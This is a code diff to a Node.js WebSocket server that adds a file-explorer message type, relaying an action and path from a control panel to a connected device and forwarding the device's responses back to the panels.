@@ -80,8 +80,21 @@ wss.on('connection', (ws, req) => {
                 }
             }
 
+            // Panel requested file explorer action
+            if (data.type === 'fileExplorer') {
+                const { targetId, action, path } = data;
+                const device = devices.get(targetId);
+                if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
+                    device.ws.send(JSON.stringify({
+                        type: 'fileExplorer',
+                        action: action,
+                        path: path
+                    }));
+                }
+            }
+
             // Device responded with data
-            if (data.type === 'dataResponse') {
+            if (data.type === 'dataResponse' || data.type === 'fileExplorerResponse') {
                 // Forward to all panels
                 wss.clients.forEach((client) => {
                     if (client.isPanel && client.readyState === WebSocket.OPEN) {
